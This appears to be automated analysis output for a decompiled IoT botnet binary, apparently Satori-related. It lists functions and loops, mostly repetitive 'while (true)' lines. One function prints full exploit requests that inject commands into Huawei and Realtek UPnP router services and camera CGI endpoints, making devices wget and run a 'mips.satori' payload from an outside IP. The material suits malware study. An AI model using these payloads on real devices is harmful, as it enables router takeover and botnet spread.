+function_eabc                                     |2   |105     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_12650                                    |1   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bdd8                                     |2   |141     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f3b0                                     |0   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_a8d8                                     |2   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c5d4                                     |2   |139     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_9a7c                                     |0   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_9310                                     |0   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_936c                                     |2   |115     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f370                                     |2   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_11f70                                    |0   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_12548                                    |4   |113     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c148                                     |5   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c40c                                     |6   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b7ac                                     |2   |144     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1265c                                    |1   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_12604                                    |5   |119     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_84a0                                     |1   |123     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b6e8                                     |5   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_da0c                                     |1   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f30c                                     |0   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c18c                                     |0   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f404                                     |0   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ad54                                     |2   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_aab8                                     |0   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bf9c                                     |1   |98      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_11ca0                                    |1   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_8134                                     |0   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c698                                     |2   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d0b4                                     |2   |194     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d458                                     |0   |306     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_fee8                                     |0   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_eb64                                     |2   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bf7c                                     |0   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c2c8                                     |2   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b988                                     |3   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_11c3c                                    |0   |99      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c090                                     |0   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_eab4                                     |3   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_12508                                    |0   |109     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c6e0                                     |2   |97      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_86e4                                     |1   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b9c8                                     |0   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d67c                                     |1   |109     |0             |0           |
+----------------------------------------------------------------------------------------------
+================================================================================
+========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
+================================================================================
+=================FUNCTION : function_ff08 ===================
+++++++++ FUNCTION START 32983
+++++++++ FUNCTION END 35708
+++++++++ FUNCTION LENGTH 2725
+                                while (true) {
+                                                    while (true) {
+                                                            while (true) {
+                                                                    while (true) {
+                                                                            while (true) {
+                                                                                    while (true) {
+                                                            while (true) {
+                                                while (true) {
+                                                while (true) {
+                                    while (true) {
+                                while (true) {
+                                while (true) {
+                                while (true) {
+                                    while (true) {
+                                while (true) {
+                                while (true) {
+                                while (true) {
+                                    while (true) {
+                                while (true) {
+                                while (true) {
+                            while (true) {
+                                while (true) {
+                            while (true) {
+                            while (true) {
+                                while (true) {
+                                    while (true) {
+                                while (true) {
+                                while (true) {
+                                while (true) {
+                                    while (true) {
+                                while (true) {
+                                while (true) {
+                        while (true) {
+                            while (true) {
+                        while (true) {
+                        while (true) {
+                        while (true) {
+                            while (true) {
+                        while (true) {
+                        while (true) {
+                            while (true) {
+                                while (true) {
+                            while (true) {
+                            while (true) {
+                            while (true) {
+                                while (true) {
+                            while (true) {
+                            while (true) {
+                    while (true) {
+                        while (true) {
+                    while (true) {
+                    while (true) {
+                while (true) {
+                    while (true) {
+                while (true) {
+                while (true) {
+                    while (true) {
+                        while (true) {
+                    while (true) {
+                    while (true) {
+                    while (true) {
+                        while (true) {
+                    while (true) {
+                    while (true) {
+                            while (true) {
+                                while (true) {
+                            while (true) {
+                            while (true) {
+                            while (true) {
+                                while (true) {
+                            while (true) {
+                            while (true) {
+                    while (true) {
+                        while (true) {
+                    while (true) {
+                    while (true) {
+                while (true) {
+                    while (true) {
+                while (true) {
+                while (true) {
+=================FUNCTION : function_ec10 ===================
+++++++++ FUNCTION START 25987
+++++++++ FUNCTION END 28296
+++++++++ FUNCTION LENGTH 2309
+        while (true) {
+                                while (true) {
+                                            while (true) {
+                                                    while (true) {
+                            while (true) {
+                                    while (true) {
+                            while (true) {
+                                    while (true) {
+                        while (true) {
+                                while (true) {
+                            while (true) {
+                                    while (true) {
+                        while (true) {
+                                while (true) {
+                        while (true) {
+                                while (true) {
+                    while (true) {
+                            while (true) {
+                    while (true) {
+                            while (true) {
+                while (true) {
+                        while (true) {
+                while (true) {
+                        while (true) {
+            while (true) {
+                    while (true) {
+                    while (true) {
+                            while (true) {
+                while (true) {
+                        while (true) {
+                while (true) {
+                        while (true) {
+            while (true) {
+                    while (true) {
+                while (true) {
+                        while (true) {
+            while (true) {
+                    while (true) {
+            while (true) {
+                    while (true) {
+        while (true) {
+                while (true) {
+                            while (true) {
+                                    while (true) {
+                        while (true) {
+                                while (true) {
+                        while (true) {
+                                while (true) {
+                    while (true) {
+                            while (true) {
+                        while (true) {
+                                while (true) {
+=================FUNCTION : function_e030 ===================
+++++++++ FUNCTION START 22167
+++++++++ FUNCTION END 23396
+++++++++ FUNCTION LENGTH 1229
+        while (true) {
+                    while (true) {
+                            while (true) {
+                                            while (true) {
+                                                        while (true) {
+                                                                while (true) {
+                                                                    while (true) {
+                                                                        while (true) {
+                                                                                while (true) {
+                                                    while (true) {
+                                                    while (true) {
+                                                            while (true) {
+                                                                while (true) {
+                                                while (true) {
+                                            while (true) {
+                                            while (true) {
+                                        while (true) {
+                                    while (true) {
+                                    while (true) {
+                                            while (true) {
+                                while (true) {
+                                        while (true) {
+                                            while (true) {
+                                        while (true) {
+                                        while (true) {
+                                    while (true) {
+                                while (true) {
+                                    while (true) {
+                                while (true) {
+                                while (true) {
+                            while (true) {
+                        while (true) {
+                while (true) {
+                while (true) {
+                    while (true) {
+                while (true) {
+                while (true) {
+            while (true) {
+        while (true) {
+            while (true) {
+                while (true) {
+            while (true) {
+            while (true) {
+        while (true) {
+    while (true) {
+=================FUNCTION : function_9b40 ===================
+++++++++ FUNCTION START 4354
+++++++++ FUNCTION END 5812
+++++++++ FUNCTION LENGTH 1458
+                if (function_c4d8(v169, (int32_t)"GET login.cgi\r\n\r\n", 17, 0x4000) < 1) {
+                    case 0: {
+                            while (true) {
+                    case 1: {
+                        while (true) {
+                    case 2: {
+                    case 3: {
+                        function_b3e8(v173, (int32_t)"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n", 185);
+                    case 4: {
+                    case 5: {
+                    case 6: {
+                                function_b3e8(v203, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v89);
+                    case 7: {
+                        function_b3e8(v205, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", 185);
+                    case 8: {
+                    case 9: {
+                        while (true) {
+                                while (true) {
+                                    while (true) {
+                    case 10: {
+                    case 11: {
+                        function_b3e8(v228, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v89);
+                    case 12: {
+                        function_ab24(v229, (int32_t)"GET /set_ftp.cgi?loginuse=");
+                        function_aad8((char *)&v100, (int32_t)"&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28");
+                            while (true) {
+                                    function_aad8((char *)&v100, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+                                function_aad8((char *)&v100, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+                    case 13: {
+                    case 14: {
+                        function_ab24(v245, (int32_t)"GET /ftptest.cgi?loginuse=");
+                        function_aad8((char *)&v100, (int32_t)" HTTP/1.0\r\n\r\n");
+                    case 15: {
+                while (true) {
+                                while (true) {
+=================FUNCTION : function_10a74 ===================
+++++++++ FUNCTION START 37433
+++++++++ FUNCTION END 38336
+++++++++ FUNCTION LENGTH 903
+                while (true) {
+            while (true) {
+                while (true) {
+            while (true) {
+            while (true) {
+            while (true) {
+                    while (true) {
+                            while (true) {
+                                        while (true) {
+                                                while (true) {
+                                                        while (true) {
+                                                            while (true) {
+                                                                                while (true) {
+                                                                                                while (true) {
+                                                                                                        while (true) {
+                                                while (true) {
+                                    while (true) {
+                                    while (true) {
+                        while (true) {
+                    while (true) {
+                    while (true) {
+        while (true) {
+            while (true) {
+        while (true) {
+        while (true) {
+=================FUNCTION : function_fbb8 ===================
+++++++++ FUNCTION START 31857
+++++++++ FUNCTION END 32778
+++++++++ FUNCTION LENGTH 921
+                while (true) {
+                            while (true) {
+                                    while (true) {
+                                            while (true) {
+                                                        while (true) {
+                                                                while (true) {
+                                                                            while (true) {
+                                                                                    while (true) {
+                                                                                            while (true) {
+                                                                        while (true) {
+                                                        while (true) {
+                                                    while (true) {
+                                        while (true) {
+                                        while (true) {
+                                    while (true) {
+                        while (true) {
+                            while (true) {
+                            while (true) {
+                        while (true) {
+            while (true) {
+        while (true) {
+            while (true) {
+            while (true) {
+        while (true) {
+=================FUNCTION : function_107dc ===================
+++++++++ FUNCTION START 36713
+++++++++ FUNCTION END 37430
+++++++++ FUNCTION LENGTH 717
+            while (true) {
+                                while (true) {
+                                            while (true) {
+                                            while (true) {
+                                    while (true) {
+                                        while (true) {
+                                                while (true) {
+                                                        while (true) {
+                                                                while (true) {
+                                        while (true) {
+                            while (true) {
+                            while (true) {
+                    while (true) {
+            while (true) {
+                while (true) {
+            while (true) {
+            while (true) {
+        while (true) {
+=================FUNCTION : function_11198 ===================
+++++++++ FUNCTION START 39366
+++++++++ FUNCTION END 41605
+++++++++ FUNCTION LENGTH 2239
+                            while (true) {
+                        while (true) {
+                        while (true) {
+                        while (true) {
+                            while (true) {
+                            while (true) {
+                            while (true) {
+                        while (true) {
+                        while (true) {
+                        while (true) {
+                            while (true) {
+                            while (true) {
+                            while (true) {
+                            while (true) {
+                                while (true) {
+                                while (true) {
+=================FUNCTION : function_870c ===================
+++++++++ FUNCTION START 1538
+++++++++ FUNCTION END 2209
+++++++++ FUNCTION LENGTH 671
+        while (true) {
+                while (true) {
+                        while (true) {
+                        while (true) {
+                                    while (true) {
+                            while (true) {
+                            while (true) {
+                                                    while (true) {
+                while (true) {
+=================FUNCTION : function_8db0 ===================
+++++++++ FUNCTION START 2487
+++++++++ FUNCTION END 2889
+++++++++ FUNCTION LENGTH 402
+    while (true) {
+        while (true) {
+            while (true) {
+        while (true) {
+    while (true) {
+        while (true) {
+=================FUNCTION : function_103e8 ===================
+++++++++ FUNCTION START 35828
+++++++++ FUNCTION END 36036
+++++++++ FUNCTION LENGTH 208
+        while (true) {
+                while (true) {
+                while (true) {
+        while (true) {
+    while (true) {
+=================FUNCTION : function_9430 ===================
+++++++++ FUNCTION START 3215
+++++++++ FUNCTION END 3670
+++++++++ FUNCTION LENGTH 455
+        while (true) {
+                while (true) {
+                while (true) {
+                                                                while (true) {
+        while (true) {
+=================FUNCTION : function_e9c8 ===================
+++++++++ FUNCTION START 24986
+++++++++ FUNCTION END 25227
+++++++++ FUNCTION LENGTH 241
+    while (true) {
+            while (true) {
+                        while (true) {
+                            while (true) {
+            while (true) {
+=================FUNCTION : function_c77c ===================
+++++++++ FUNCTION START 17494
+++++++++ FUNCTION END 20322
+++++++++ FUNCTION LENGTH 2828
+        while (true) {
+                    while (true) {
+                            while (true) {
+                                while (true) {
+                while (true) {
+=================FUNCTION : function_f814 ===================
+++++++++ FUNCTION START 31171
+++++++++ FUNCTION END 31630
+++++++++ FUNCTION LENGTH 459
+        while (true) {
+            while (true) {
+                        while (true) {
+                                        while (true) {
+                                                                while (true) {
+=================FUNCTION : function_106c0 ===================
+++++++++ FUNCTION START 36440
+++++++++ FUNCTION END 36710
+++++++++ FUNCTION LENGTH 270
+                while (true) {
+                            while (true) {
+                                    while (true) {
+            while (true) {
+=================FUNCTION : function_1057c ===================
+++++++++ FUNCTION START 36148
+++++++++ FUNCTION END 36437
+++++++++ FUNCTION LENGTH 289
+        while (true) {
+                        while (true) {
+                                while (true) {
+        while (true) {
+=================FUNCTION : function_b4a8 ===================
+++++++++ FUNCTION START 10067
+++++++++ FUNCTION END 10517
+++++++++ FUNCTION LENGTH 450
+    while (true) {
+                                while (true) {
+                                    while (true) {
+                while (true) {
+=================FUNCTION : function_b5bc ===================
+++++++++ FUNCTION START 10618
+++++++++ FUNCTION END 11126
+++++++++ FUNCTION LENGTH 508
+        while (true) {
+                                    while (true) {
+                                        while (true) {
+                    while (true) {
+=================FUNCTION : function_11610 ===================
+++++++++ FUNCTION START 42120
+++++++++ FUNCTION END 42309
+++++++++ FUNCTION LENGTH 189
+        while (true) {
+        while (true) {
+    while (true) {
+=================FUNCTION : function_ac28 ===================
+++++++++ FUNCTION START 7230
+++++++++ FUNCTION END 7417
+++++++++ FUNCTION LENGTH 187
+            while (true) {
+        while (true) {
+    while (true) {
+=================FUNCTION : function_12688 ===================
+++++++++ FUNCTION START 46311
+++++++++ FUNCTION END 46557
+++++++++ FUNCTION LENGTH 246
+                while (true) {
+        while (true) {
+            while (true) {
+=================FUNCTION : function_ab70 ===================
+++++++++ FUNCTION START 6981
+++++++++ FUNCTION END 7227
+++++++++ FUNCTION LENGTH 246
+            while (true) {
+            while (true) {
+            while (true) {
+=================FUNCTION : function_b420 ===================
+++++++++ FUNCTION START 9866
+++++++++ FUNCTION END 10064
+++++++++ FUNCTION LENGTH 198
+        while (true) {
+        while (true) {
+    while (true) {
+=================FUNCTION : function_11520 ===================
+++++++++ FUNCTION START 41900
+++++++++ FUNCTION END 42117
+++++++++ FUNCTION LENGTH 217
+        while (true) {
+        while (true) {
+        while (true) {
+=================FUNCTION : function_ad54_1 ===================
+++++++++ FUNCTION START 7658
+++++++++ FUNCTION END 8005
+++++++++ FUNCTION LENGTH 347
+    while (true) {
+    while (true) {
+    while (true) {
+=================FUNCTION : function_b210 ===================
+++++++++ FUNCTION START 9430
+++++++++ FUNCTION END 9761
+++++++++ FUNCTION LENGTH 331
+        while (true) {
+                            while (true) {
+=================FUNCTION : function_d8c0 ===================
+++++++++ FUNCTION START 21894
+++++++++ FUNCTION END 22059
+++++++++ FUNCTION LENGTH 165
+            while (true) {
+    while (true) {
+=================FUNCTION : function_e5cc ===================
+++++++++ FUNCTION START 23754
+++++++++ FUNCTION END 24054
+++++++++ FUNCTION LENGTH 300
+            while (true) {
+                while (true) {
+=================FUNCTION : function_12334 ===================
+++++++++ FUNCTION START 45058
+++++++++ FUNCTION END 45239
+++++++++ FUNCTION LENGTH 181
+    while (true) {
+        while (true) {
+=================FUNCTION : function_110ac ===================
+++++++++ FUNCTION START 39099
+++++++++ FUNCTION END 39363
+++++++++ FUNCTION LENGTH 264
+    while (true) {
+        while (true) {
+=================FUNCTION : function_e940 ===================
+++++++++ FUNCTION START 24790
+++++++++ FUNCTION END 24983
+++++++++ FUNCTION LENGTH 193
+        while (true) {
+                while (true) {
+=================FUNCTION : function_bff0 ===================
+++++++++ FUNCTION START 14040
+++++++++ FUNCTION END 14260
+++++++++ FUNCTION LENGTH 220
+        while (true) {
+        while (true) {
+=================FUNCTION : function_11790 ===================
+++++++++ FUNCTION START 42564
+++++++++ FUNCTION END 42698
+++++++++ FUNCTION LENGTH 134
+    while (true) {
+        while (true) {
+=================FUNCTION : function_82c0 ===================
+++++++++ FUNCTION START 827
+++++++++ FUNCTION END 993
+++++++++ FUNCTION LENGTH 166
+        while (true) {
+                    while (true) {
+=================FUNCTION : function_81d0 ===================
+++++++++ FUNCTION START 655
+++++++++ FUNCTION END 824
+++++++++ FUNCTION LENGTH 169
+        while (true) {
+                    while (true) {
+=================FUNCTION : function_d2a4 ===================
+++++++++ FUNCTION START 20854
+++++++++ FUNCTION END 21076
+++++++++ FUNCTION LENGTH 222
+        while (true) {
+                while (true) {
+=================FUNCTION : function_be94 ===================
+++++++++ FUNCTION START 13402
+++++++++ FUNCTION END 13538
+++++++++ FUNCTION LENGTH 136
+    while (true) {
+=================FUNCTION : function_f728 ===================
+++++++++ FUNCTION START 30923
+++++++++ FUNCTION END 31064
+++++++++ FUNCTION LENGTH 141
+    while (true) {
+=================FUNCTION : function_d6d4 ===================
+++++++++ FUNCTION START 21500
+++++++++ FUNCTION END 21648
+++++++++ FUNCTION LENGTH 148
+    while (true) {
+=================FUNCTION : function_11010 ===================
+++++++++ FUNCTION START 38886
+++++++++ FUNCTION END 39096
+++++++++ FUNCTION LENGTH 210
+    while (true) {
+=================FUNCTION : function_98b8 ===================
+++++++++ FUNCTION START 3771
+++++++++ FUNCTION END 3900
+++++++++ FUNCTION LENGTH 129
+    while (true) {
+=================FUNCTION : function_114a0 ===================
+++++++++ FUNCTION START 41608
+++++++++ FUNCTION END 41727
+++++++++ FUNCTION LENGTH 119
+    while (true) {
+=================FUNCTION : function_f26c ===================
+++++++++ FUNCTION START 29275
+++++++++ FUNCTION END 29404
+++++++++ FUNCTION LENGTH 129
+    while (true) {
+=================FUNCTION : function_b0e4 ===================
+++++++++ FUNCTION START 9230
+++++++++ FUNCTION END 9427
+++++++++ FUNCTION LENGTH 197
+            while (true) {
+=================FUNCTION : function_116fc ===================
+++++++++ FUNCTION START 42312
+++++++++ FUNCTION END 42438
+++++++++ FUNCTION LENGTH 126
+    while (true) {
+=================FUNCTION : function_eae8 ===================
+++++++++ FUNCTION START 25639
+++++++++ FUNCTION END 25762
+++++++++ FUNCTION LENGTH 123
+    while (true) {
+=================FUNCTION : function_f1a0 ===================
+++++++++ FUNCTION START 29040
+++++++++ FUNCTION END 29155
+++++++++ FUNCTION LENGTH 115
+    while (true) {
+=================FUNCTION : function_ae98 ===================
+++++++++ FUNCTION START 8008
+++++++++ FUNCTION END 8128
+++++++++ FUNCTION LENGTH 120
+    while (true) {
+=================FUNCTION : function_12194 ===================
+++++++++ FUNCTION START 44768
+++++++++ FUNCTION END 44922
+++++++++ FUNCTION LENGTH 154
+    while (true) {
+=================FUNCTION : function_11d40 ===================
+++++++++ FUNCTION START 43724
+++++++++ FUNCTION END 43921
+++++++++ FUNCTION LENGTH 197
+            while (true) {
+=================FUNCTION : function_10f64 ===================
+++++++++ FUNCTION START 38691
+++++++++ FUNCTION END 38883
+++++++++ FUNCTION LENGTH 192
+            while (true) {
+=================FUNCTION : function_9994 ===================
+++++++++ FUNCTION START 3903
+++++++++ FUNCTION END 4032
+++++++++ FUNCTION LENGTH 129
+    while (true) {
+=================FUNCTION : function_83b4 ===================
+++++++++ FUNCTION START 996
+++++++++ FUNCTION END 1114
+++++++++ FUNCTION LENGTH 118
+    while (true) {
+=================FUNCTION : function_a988 ===================
+++++++++ FUNCTION START 6223
+++++++++ FUNCTION END 6407
+++++++++ FUNCTION LENGTH 184
+        while (true) {
+=================FUNCTION : function_acf0 ===================
+++++++++ FUNCTION START 7420
+++++++++ FUNCTION END 7556
+++++++++ FUNCTION LENGTH 136
+            while (true) {
+=================FUNCTION : function_8c44 ===================
+++++++++ FUNCTION START 2317
+++++++++ FUNCTION END 2484
+++++++++ FUNCTION LENGTH 167
+    while (true) {
+================================================================================
+========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
+================================================================================
+=============================WHILE LOOPS ID : 1 @ function_81d0 ====================================
+++++++++ WHILE START : 752 
+++++++++ WHILE FUNCTION : function_81d0 
+++++++++ WHILE END : 816 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 2 @ function_82c0 ====================================
+++++++++ WHILE START : 924 
+++++++++ WHILE FUNCTION : function_82c0 
+++++++++ WHILE END : 985 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 4 @ function_870c ====================================
+++++++++ WHILE START : 1676 
+++++++++ WHILE FUNCTION : function_870c 
+++++++++ WHILE END : 2146 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 7 @ function_8db0 ====================================
+++++++++ WHILE START : 2641 
+++++++++ WHILE FUNCTION : function_8db0 
+++++++++ WHILE END : 2711 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 12 @ function_9430 ====================================
+++++++++ WHILE START : 3333 
+++++++++ WHILE FUNCTION : function_9430 
+++++++++ WHILE END : 3635 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 18 @ function_9b40 ====================================
+++++++++ WHILE START : 5167 
+++++++++ WHILE FUNCTION : function_9b40 
+++++++++ WHILE END : 5247 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 19 @ function_9b40 ====================================
+++++++++ WHILE START : 5303 
+++++++++ WHILE FUNCTION : function_9b40 
+++++++++ WHILE END : 5365 
+++++++++ INTRESTING INSTRUCTIONS :  
+		function_aad8((char *)&v100, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+		function_aad8((char *)&v100, (int32_t)"%29 HTTP/1.0\r\n\r\n");
+=============================WHILE LOOPS ID : 20 @ function_9b40 ====================================
+++++++++ WHILE START : 5523 
+++++++++ WHILE FUNCTION : function_9b40 
+++++++++ WHILE END : 5629 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 36 @ function_b210 ====================================
+++++++++ WHILE START : 9537 
+++++++++ WHILE FUNCTION : function_b210 
+++++++++ WHILE END : 9748 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 40 @ function_b4a8 ====================================
+++++++++ WHILE START : 10304 
+++++++++ WHILE FUNCTION : function_b4a8 
+++++++++ WHILE END : 10516 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 41 @ function_b5bc ====================================
+++++++++ WHILE START : 10894 
+++++++++ WHILE FUNCTION : function_b5bc 
+++++++++ WHILE END : 11122 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 45 @ function_c77c ====================================
+++++++++ WHILE START : 18878 
+++++++++ WHILE FUNCTION : function_c77c 
+++++++++ WHILE END : 20314 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 46 @ function_d2a4 ====================================
+++++++++ WHILE START : 20970 
+++++++++ WHILE FUNCTION : function_d2a4 
+++++++++ WHILE END : 21072 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 50 @ function_e030 ====================================
+++++++++ WHILE START : 22288 
+++++++++ WHILE FUNCTION : function_e030 
+++++++++ WHILE END : 23167 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 63 @ function_e5cc ====================================
+++++++++ WHILE START : 23862 
+++++++++ WHILE FUNCTION : function_e5cc 
+++++++++ WHILE END : 24021 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 64 @ function_e940 ====================================
+++++++++ WHILE START : 24888 
+++++++++ WHILE FUNCTION : function_e940 
+++++++++ WHILE END : 24979 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 65 @ function_e9c8 ====================================
+++++++++ WHILE START : 25089 
+++++++++ WHILE FUNCTION : function_e9c8 
+++++++++ WHILE END : 25226 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 68 @ function_ec10 ====================================
+++++++++ WHILE START : 26226 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 26382 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 69 @ function_ec10 ====================================
